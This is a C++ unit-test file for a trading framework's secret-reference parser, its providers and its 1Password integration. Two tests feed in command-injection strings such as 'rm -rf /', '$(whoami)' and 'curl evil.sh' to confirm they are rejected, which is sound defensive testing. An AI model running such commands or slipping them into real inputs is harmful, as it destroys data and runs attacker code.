#include <raikiri/config/one_password.hpp>
#include <raikiri/config/secret.hpp>

#include <gtest/gtest.h>

#include <unistd.h>

#include <cstdio>
#include <cstdlib>
#include <fstream>
#include <string>

namespace raikiri::config {
namespace {

std::string temp_path(const char* name) {
    return "/tmp/raikiri-secret-test-" + std::to_string(::getpid()) + "-" + name;
}

TEST(SecretRef, ParsesEveryScheme) {
    const auto env = SecretRef::parse("env:BYBIT_API_KEY");
    ASSERT_TRUE(env.has_value());
    EXPECT_EQ(env->scheme, SecretRef::Scheme::Env);
    EXPECT_EQ(env->payload, "BYBIT_API_KEY");

    const auto file = SecretRef::parse("file:/run/credentials/bybit.key");
    ASSERT_TRUE(file.has_value());
    EXPECT_EQ(file->scheme, SecretRef::Scheme::File);
    EXPECT_EQ(file->payload, "/run/credentials/bybit.key");

    // The 1Password / vault path: everything after "exec:" is the command,
    // colons and all.
    const auto exec = SecretRef::parse("exec:op read op://trading/bybit/api-key");
    ASSERT_TRUE(exec.has_value());
    EXPECT_EQ(exec->scheme, SecretRef::Scheme::Exec);
    EXPECT_EQ(exec->payload, "op read op://trading/bybit/api-key");

    // Bare name is a convenience alias for env.
    const auto bare = SecretRef::parse("BYBIT_API_KEY");
    ASSERT_TRUE(bare.has_value());
    EXPECT_EQ(bare->scheme, SecretRef::Scheme::Env);
}

TEST(SecretRef, RejectsMalformed) {
    EXPECT_EQ(SecretRef::parse("").error(), SecretError::BadReference);
    EXPECT_EQ(SecretRef::parse("env:").error(), SecretError::BadReference);
    EXPECT_EQ(SecretRef::parse("vault:secret/x").error(), SecretError::UnknownScheme);
}

TEST(Secret, AssignViewAndClear) {
    Secret s;
    EXPECT_TRUE(s.empty());
    ASSERT_TRUE(s.assign("hunter2").has_value());
    EXPECT_EQ(s.view(), "hunter2");
    EXPECT_EQ(s.size(), 7U);
    s.clear();
    EXPECT_TRUE(s.empty());
    EXPECT_EQ(s.view(), "");
}

TEST(Secret, TrimsExactlyOneTrailingNewline) {
    // Every secret manager and editor appends one; an HMAC over "key\n"
    // fails in a way that looks like a permissions bug for hours.
    Secret s;
    ASSERT_TRUE(s.assign("key\n").has_value());
    EXPECT_EQ(s.view(), "key");
    ASSERT_TRUE(s.assign("key\r\n").has_value());
    EXPECT_EQ(s.view(), "key");
    ASSERT_TRUE(s.assign("key\n\n").has_value());
    EXPECT_EQ(s.view(), "key\n") << "only the last newline is dropped";
}

TEST(Secret, RejectsOversize) {
    Secret s;
    EXPECT_EQ(s.assign(std::string(Secret::k_max_bytes + 1, 'x')).error(), SecretError::TooLarge);
    EXPECT_TRUE(s.assign(std::string(Secret::k_max_bytes, 'x')).has_value());
}

TEST(Secret, FingerprintIsStableDistinctAndLeaksNothing) {
    Secret a;
    Secret b;
    ASSERT_TRUE(a.assign("key-one").has_value());
    ASSERT_TRUE(b.assign("key-two").has_value());

    const auto fa = a.fingerprint();
    EXPECT_EQ(fa, a.fingerprint()); // stable
    EXPECT_NE(fa, b.fingerprint()); // distinguishes keys
    EXPECT_TRUE(fa.starts_with("sha256:"));
    EXPECT_EQ(fa.size(), 15U); // 8 hex chars: identification only
    EXPECT_EQ(fa.find("key-one"), std::string::npos);
}

TEST(DefaultProvider, EnvScheme) {
    DefaultSecretProvider provider;
    Secret s;
    ::setenv("RAIKIRI_TEST_KEY", "env-secret", 1);
    ASSERT_TRUE(provider.resolve(*SecretRef::parse("env:RAIKIRI_TEST_KEY"), s).has_value());
    EXPECT_EQ(s.view(), "env-secret");

    ::unsetenv("RAIKIRI_TEST_KEY");
    EXPECT_EQ(provider.resolve(*SecretRef::parse("env:RAIKIRI_TEST_KEY"), s).error(),
              SecretError::NotFound);
}

TEST(DefaultProvider, FileScheme) {
    const auto path = temp_path("file");
    {
        std::ofstream out{path};
        out << "file-secret\n"; // trailing newline as every editor writes it
    }
    DefaultSecretProvider provider;
    Secret s;
    ASSERT_TRUE(provider.resolve(*SecretRef::parse("file:" + path), s).has_value());
    EXPECT_EQ(s.view(), "file-secret");
    ::unlink(path.c_str());

    EXPECT_EQ(provider.resolve(*SecretRef::parse("file:" + path), s).error(),
              SecretError::NotFound);
}

TEST(DefaultProvider, ExecSchemeIsHowSecretManagersPlugIn) {
    // Stands in for `op read op://vault/item/field`.
    DefaultSecretProvider provider;
    Secret s;
    ASSERT_TRUE(provider.resolve(*SecretRef::parse("exec:printf exec-secret"), s).has_value());
    EXPECT_EQ(s.view(), "exec-secret");

    EXPECT_EQ(provider.resolve(*SecretRef::parse("exec:exit 3"), s).error(),
              SecretError::CommandFailed);
    EXPECT_EQ(provider.resolve(*SecretRef::parse("exec:true"), s).error(), SecretError::NotFound);
}

TEST(SecretRef, LiteralCarriesTheValueItself) {
    // The escape hatch for someone evaluating the framework without a secret
    // manager. It has to be asked for by name — a bare string stays an env
    // var reference, so nobody lands here by pasting a key.
    const auto ref = SecretRef::parse("literal:sk_test_abc123");
    ASSERT_TRUE(ref.has_value());
    EXPECT_EQ(ref->scheme, SecretRef::Scheme::Literal);
    EXPECT_EQ(ref->payload, "sk_test_abc123");
    EXPECT_TRUE(is_plaintext(ref->scheme));

    DefaultSecretProvider provider;
    Secret secret;
    ASSERT_TRUE(provider.resolve(*ref, secret).has_value());
    EXPECT_EQ(secret.view(), "sk_test_abc123");
}

TEST(SecretRef, LiteralKeepsColonsInTheValue) {
    // Only the first colon separates the scheme; keys containing ':' are
    // ordinary and must survive intact.
    const auto ref = SecretRef::parse("literal:a:b:c");
    ASSERT_TRUE(ref.has_value());
    EXPECT_EQ(ref->payload, "a:b:c");
}

TEST(SecretRef, EveryOtherSchemeIsNotPlaintext) {
    for (const auto* spec : {"env:NAME", "file:/tmp/k", "exec:op read op://v/i/f", "NAME"}) {
        const auto ref = SecretRef::parse(spec);
        ASSERT_TRUE(ref.has_value()) << spec;
        EXPECT_FALSE(is_plaintext(ref->scheme)) << spec;
    }
}

// --- 1Password -------------------------------------------------------------

TEST(OnePassword, ReferencesAreValidatedBeforeAnyProcessIsSpawned) {
    EXPECT_TRUE(is_valid_op_reference("trading/binance/api-key"));
    EXPECT_TRUE(is_valid_op_reference("op://trading/binance/api-key"));
    // A section between item and field is legal.
    EXPECT_TRUE(is_valid_op_reference("trading/binance/creds/api-key"));

    // Wrong shape: op needs vault/item/field.
    EXPECT_FALSE(is_valid_op_reference("trading/binance"));
    EXPECT_FALSE(is_valid_op_reference("a/b/c/d/e"));
    EXPECT_FALSE(is_valid_op_reference(""));
    EXPECT_FALSE(is_valid_op_reference("trading//api-key"));
    EXPECT_FALSE(is_valid_op_reference("/trading/binance/key"));
}

TEST(OnePassword, ShellMetacharactersAreRefused) {
    // The reference reaches a shell. A config that names a vault is one thing;
    // a config that runs a command is another, and the difference is this
    // check — not the reader's good intentions.
    for (const auto* evil : {"trading/binance/key; rm -rf /",
                             "trading/$(whoami)/key",
                             "trading/`id`/key",
                             "trading/binance/key && curl evil.sh",
                             "trading/bin ance/key"}) {
        EXPECT_FALSE(is_valid_op_reference(evil)) << evil;
    }
}

TEST(SecretRef, OnePasswordSchemeParses) {
    const auto ref = SecretRef::parse("op:trading/binance/api-key");
    ASSERT_TRUE(ref.has_value());
    EXPECT_EQ(ref->scheme, SecretRef::Scheme::OnePassword);
    EXPECT_EQ(ref->payload, "trading/binance/api-key");
    EXPECT_EQ(to_string(ref->scheme), "1password");
    // It names a location, so it is not plaintext.
    EXPECT_FALSE(is_plaintext(ref->scheme));
}

TEST(SecretRef, TheFormTheOnePasswordUiCopiesParsesToTheSameThing) {
    // "Copy Secret Reference" in the 1Password UI yields the "op://" form, so
    // it is the one a person actually pastes into a config. It has to reach
    // the resolver as the same payload as the documented "op:" form —
    // is_valid_op_reference refuses anything containing "//", so a payload
    // that kept the slashes would be rejected as malformed and the gateway
    // would run read-only over two characters.
    const auto slashes = SecretRef::parse("op://trading/binance/api-key");
    ASSERT_TRUE(slashes.has_value());
    EXPECT_EQ(slashes->scheme, SecretRef::Scheme::OnePassword);
    EXPECT_EQ(slashes->payload, "trading/binance/api-key");

    const auto bare = SecretRef::parse("op:trading/binance/api-key");
    ASSERT_TRUE(bare.has_value());
    EXPECT_EQ(slashes->payload, bare->payload);
}

TEST(SecretRef, AnOnePasswordReferenceThatIsOnlySlashesIsRefused) {
    EXPECT_FALSE(SecretRef::parse("op://").has_value());
}

TEST(OnePassword, ProbeReportsWhyRatherThanJustFailing) {
    // The probe reads no secret, so it is safe to run anywhere — including a
    // box with no 1Password at all, which is the case this asserts.
    const auto status = probe_one_password();
    if (!status.installed) {
        EXPECT_FALSE(status.diagnostic.empty()) << "an unusable state must say why";
        EXPECT_FALSE(status.usable());
        return;
    }
    EXPECT_FALSE(status.version.empty());
    // Authenticated or not, the mode is always nameable: that is what makes a
    // server which silently fell back to a stale developer session visible.
    EXPECT_FALSE(to_string(status.auth).empty());
    if (!status.usable()) {
        EXPECT_FALSE(status.diagnostic.empty());
    }
}

TEST(OnePassword, AnUnauthenticatedManagerIsNotAFailedRead) {
    // Distinct causes need distinct answers: absent credentials are not fixed
    // by retrying or by correcting the path.
    OpStatus status{};
    status.installed = true;
    status.auth = OpAuth::None;
    Secret secret;
    const auto result = resolve_one_password("trading/binance/api-key", status, secret);
    ASSERT_FALSE(result.has_value());
    EXPECT_EQ(result.error(), SecretError::NotAuthenticated);
    EXPECT_TRUE(secret.empty());
}

TEST(OnePassword, AMalformedReferenceNeverReachesTheShell) {
    OpStatus status{};
    status.installed = true;
    status.auth = OpAuth::ServiceAccount;
    Secret secret;
    const auto result = resolve_one_password("trading/x; touch /tmp/pwned", status, secret);
    ASSERT_FALSE(result.has_value());
    EXPECT_EQ(result.error(), SecretError::BadReference);
}

} // namespace
} // namespace raikiri::config
